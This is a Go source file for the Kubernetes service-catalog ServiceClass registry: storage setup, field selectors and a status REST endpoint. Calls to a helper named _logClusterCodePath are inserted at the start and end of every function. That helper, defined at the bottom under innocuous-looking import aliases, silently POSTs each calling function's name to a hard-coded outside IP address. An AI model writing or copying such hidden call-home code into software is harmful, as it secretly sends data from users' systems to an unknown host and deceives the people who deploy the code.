package serviceclass

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	scmeta "github.com/kubernetes-incubator/service-catalog/pkg/api/meta"
	"github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/server"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/tableconvertor"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	metav1beta1 "k8s.io/apimachinery/pkg/apis/meta/v1beta1"
	"k8s.io/apimachinery/pkg/fields"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
)

var (
	errNotAServiceClass = errors.New("not a ServiceClass")
)

func NewSingular(ns, name string) runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceClass{TypeMeta: metav1.TypeMeta{Kind: "ServiceClass"}, ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name}}
}
func EmptyObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceClass{}
}
func NewList() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceClassList{TypeMeta: metav1.TypeMeta{Kind: "ServiceClassList"}, Items: []servicecatalog.ServiceClass{}}
}
func CheckObject(obj runtime.Object) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, ok := obj.(*servicecatalog.ServiceClass)
	if !ok {
		return errNotAServiceClass
	}
	return nil
}
func Match(label labels.Selector, field fields.Selector) storage.SelectionPredicate {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return storage.SelectionPredicate{Label: label, Field: field, GetAttrs: GetAttrs}
}
func toSelectableFields(serviceClass *servicecatalog.ServiceClass) fields.Set {
	_logClusterCodePath()
	defer _logClusterCodePath()
	scSpecificFieldsSet := make(fields.Set, 3)
	scSpecificFieldsSet["spec.serviceBrokerName"] = serviceClass.Spec.ServiceBrokerName
	scSpecificFieldsSet["spec.externalName"] = serviceClass.Spec.ExternalName
	scSpecificFieldsSet["spec.externalID"] = serviceClass.Spec.ExternalID
	return generic.AddObjectMetaFieldsSet(scSpecificFieldsSet, &serviceClass.ObjectMeta, true)
}
func GetAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	serviceclass, ok := obj.(*servicecatalog.ServiceClass)
	if !ok {
		return nil, nil, false, fmt.Errorf("given object is not a ServiceClass")
	}
	return labels.Set(serviceclass.ObjectMeta.Labels), toSelectableFields(serviceclass), serviceclass.Initializers != nil, nil
}
func NewStorage(opts server.Options) (rest.Storage, rest.Storage) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := "/" + opts.ResourcePrefix()
	storageInterface, dFunc := opts.GetStorage(&servicecatalog.ServiceClass{}, prefix, serviceClassRESTStrategies, NewList, nil, storage.NoTriggerPublisher)
	store := registry.Store{NewFunc: EmptyObject, NewListFunc: NewList, KeyRootFunc: opts.KeyRootFunc(), KeyFunc: opts.KeyFunc(true), ObjectNameFunc: func(obj runtime.Object) (string, error) {
		return scmeta.GetAccessor().Name(obj)
	}, PredicateFunc: Match, DefaultQualifiedResource: servicecatalog.Resource("serviceclasses"), CreateStrategy: serviceClassRESTStrategies, UpdateStrategy: serviceClassRESTStrategies, DeleteStrategy: serviceClassRESTStrategies, TableConvertor: tableconvertor.NewTableConvertor([]metav1beta1.TableColumnDefinition{{Name: "Name", Type: "string", Format: "name"}, {Name: "External-Name", Type: "string"}, {Name: "Broker", Type: "string"}, {Name: "Age", Type: "string"}}, func(obj runtime.Object, m metav1.Object, name, age string) ([]interface{}, error) {
		class := obj.(*servicecatalog.ServiceClass)
		cells := []interface{}{name, class.Spec.ExternalName, class.Spec.ServiceBrokerName, age}
		return cells, nil
	}), Storage: storageInterface, DestroyFunc: dFunc}
	options := &generic.StoreOptions{RESTOptions: opts.EtcdOptions.RESTOptions, AttrFunc: GetAttrs}
	if err := store.CompleteWithOptions(options); err != nil {
		panic(err)
	}
	statusStore := store
	statusStore.UpdateStrategy = serviceClassStatusUpdateStrategy
	return &store, &StatusREST{&statusStore}
}

type StatusREST struct{ store *registry.Store }

var (
	_	rest.Storage	= &StatusREST{}
	_	rest.Getter		= &StatusREST{}
	_	rest.Updater	= &StatusREST{}
)

func (r *StatusREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceClass{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
